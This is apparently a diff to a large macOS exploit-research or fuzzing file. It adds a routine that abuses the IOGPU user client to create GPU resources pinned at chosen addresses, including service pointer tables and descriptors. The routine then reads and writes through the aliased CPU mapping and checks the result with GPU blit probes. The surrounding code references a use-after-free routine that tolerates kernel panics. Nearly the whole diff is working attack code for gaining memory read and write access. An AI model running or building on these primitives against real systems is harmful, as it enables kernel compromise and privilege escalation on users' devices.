@@ -15020,6 +15020,136 @@ static void p_gpuvmscan2(void) {
     LOG("[gscan2] done (alive), total ops %ld", op);
 }
 
+// V92: pinned-GPUAddress resources (new_resource format B with pinned fields).
+// variant 0 = task spec: +0x30 u64 pinned addr, +0x38 u64 size (base fields as
+// in the traced plain alloc); variant 1 = the pinned record from the macOS
+// trace: +0x08 u64 = addr, +0x14 = 0xc430, +0x30 = 0, +0x48 = size,
+// +0x58 = 0x38000000.
+static uint32_t pinned_resource(io_connect_t c, uint64_t addr, uint64_t size,
+                                uint64_t *gpuva_out, uint8_t **cpu_out, int variant) {
+    uint8_t *in = must_map(0x1000);
+    uint8_t *out = must_map(0x1000);
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x00;
+    if (variant == 0) {
+        *(uint32_t *)(in + 0x08) = 0x00010001;
+        *(uint32_t *)(in + 0x0c) = 1;
+        *(uint32_t *)(in + 0x10) = 0x01000101;
+        *(uint32_t *)(in + 0x14) = 0x470;
+        *(uint64_t *)(in + 0x30) = addr;      // pinned GPUAddress
+        *(uint64_t *)(in + 0x38) = size;
+        *(uint64_t *)(in + 0x48) = size;      // sysMemSize (traced offset)
+    } else {
+        *(uint64_t *)(in + 0x08) = addr;      // trace: pinned record q1
+        *(uint32_t *)(in + 0x10) = 0x01000101;
+        *(uint32_t *)(in + 0x14) = 0xc430;
+        *(uint64_t *)(in + 0x48) = size;
+        *(uint64_t *)(in + 0x58) = 0x38000000;
+    }
+    size_t osz = 0x58;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+    uint64_t gpuva = *(uint64_t *)(out + 0x00);
+    uint64_t cpup  = *(uint64_t *)(out + 0x08);
+    uint32_t rid   = *(uint32_t *)(out + 0x24);
+    LOG("[pin]   v%d create pinned 0x%llx sz 0x%llx -> kr 0x%08x rid %u GPUVA 0x%llx cpu %llx",
+        variant, addr, size, kr, rid, gpuva, cpup);
+    if (!kr && rid) {
+        uint64_t *q = (uint64_t *)out;
+        LOG("[pin]   out: %016llx %016llx %016llx %016llx", q[0], q[1], q[2], q[3]);
+    }
+    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+    if (kr || !rid) return 0;
+    *gpuva_out = gpuva;
+    *cpu_out = (uint8_t *)(uintptr_t)cpup;
+    return rid;
+}
+
+static void p_pinned(void) {
+    LOG("[pin] v92: pinned-GPUAddress aliasing experiments");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    // Metal session for GPU read-probes (read X via patched blit)
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    memset([bufA contents], 0x41, 0x10000);
+    memset([bufB contents], 0, 0x10000);
+    g_srcx = [bufA gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;
+    g_dstx = [bufB gpuAddress] ^ 0x5a5a5a5a5a5a5a5aULL;
+
+    const char *one = getenv("FUZZ_PIN_ADDR");
+    const char *sk = getenv("FUZZ_PIN_SKIP");
+    long skip = sk ? atol(sk) : 0;
+
+    static const struct { uint64_t addr; const char *n; } tgts[] = {
+        { 0x1000800000ULL,  "E0 calib-free" },
+        { 0,                "E1 alias-own-buffer" },
+        { 0x10001c000ULL,   "E2 svc-ptr-table" },
+        { 0x10000c000ULL,   "E3 svc-page" },
+        { 0x100110000ULL,   "E4 svc-desc" },
+        { 0x100120000ULL,   "E5 svc-desc2" },
+        { 0x1000000000ULL,  "E6 sp0x10-base" },
+        { 0x1000004000ULL,  "E7 sp0x10-packed" },
+        { 0x000040000ULL,   "E8 wild-fatalread" },
+        { 0x100004000ULL,   "E9 wild-fatalread" },
+        { 0x100001000ULL,   "E10 wild-low" },
+        { 0x10000000000ULL, "E11 sp0x100" },
+    };
+    for (unsigned ti = 0; ti < sizeof(tgts)/sizeof(tgts[0]); ti++) {
+        if (one) {
+            uint64_t want = strtoull(one, NULL, 0);
+            if (tgts[ti].addr != want) continue;
+        }
+        if (ti < (unsigned)skip) continue;
+        uint64_t X = tgts[ti].addr;
+        uint8_t *ownCpu = NULL;   // E1: the buffer being aliased
+        if (ti == 1) {
+            // alias on our own plain resource
+            uint64_t g0 = 0;
+            uint32_t r0 = gpu_resource2(c, 0x10000, &g0, &ownCpu);
+            if (!r0 || !ownCpu) { LOG("[pin] E1: base resource failed"); continue; }
+            memset(ownCpu, 0x11, 0x10000);
+            X = g0;
+        }
+        LOG("[pin] === %s: pinned 0x%llx ===", tgts[ti].n, X);
+        uint64_t gpuva = 0;
+        uint8_t *cpu = NULL;
+        uint32_t rid = pinned_resource(c, X, 0x10000, &gpuva, &cpu, 0);
+        if (!rid) rid = pinned_resource(c, X, 0x10000, &gpuva, &cpu, 1);
+        if (!rid) { LOG("[pin] %s: both variants failed", tgts[ti].n); continue; }
+        LOG("[pin] %s: OK rid %u GPUVA 0x%llx (requested 0x%llx) cpu %p", tgts[ti].n, rid, gpuva, X, cpu);
+        if (!cpu) continue;
+        // GPU-side pre-content (Metal VM read probe)
+        long np = gscan2_one(mq, bufA, bufB, X, 0);
+        uint8_t *bb = (uint8_t *)[bufB contents];
+        LOG("[pin] %s: GPU-probe slots %ld, B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x",
+            tgts[ti].n, np, bb[0], bb[1], bb[2], bb[3], bb[4], bb[5], bb[6], bb[7]);
+        // CPU-side alias read
+        LOG("[pin] %s: CPU alias[0..15] %02x %02x %02x %02x %02x %02x %02x %02x",
+            tgts[ti].n, cpu[0], cpu[1], cpu[2], cpu[3], cpu[4], cpu[5], cpu[6], cpu[7]);
+        // CPU write marker, re-probe via GPU
+        uint64_t marker = 0xdeadc0de00000000ULL | (X & 0xffffffffULL);
+        uint64_t *mp = (uint64_t *)cpu;
+        for (int i = 0; i < 0x1000 / 8; i++) mp[i] = marker;
+        long np2 = gscan2_one(mq, bufA, bufB, X, 0);
+        long nm = 0;
+        uint64_t *bp = (uint64_t *)bb;
+        for (int i = 0; i < 0x1000 / 8; i++) if (bp[i] == marker) nm++;
+        LOG("[pin] %s: CPU-write -> GPU-probe markers %ld/512 (slots %ld) %s",
+            tgts[ti].n, nm, np2, nm > 256 ? "*** ALIAS WRITE VISIBLE TO GPU ***" : "");
+        if (ti == 1 && ownCpu) {
+            // alias-on-own-buffer check: marker visible through the original mapping?
+            LOG("[pin] E1: own buffer[0..7] after alias write: %02x %02x %02x %02x %s",
+                ownCpu[0], ownCpu[1], ownCpu[2], ownCpu[3],
+                ownCpu[0] == 0xde ? "ALIAS WORKS" : "no alias");
+        }
+    }
+    LOG("[pin] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -15150,6 +15280,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_PINNED")) { p_pinned(); LOG("[probe13] pinned-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUVMSCAN2")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUVMSCAN")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
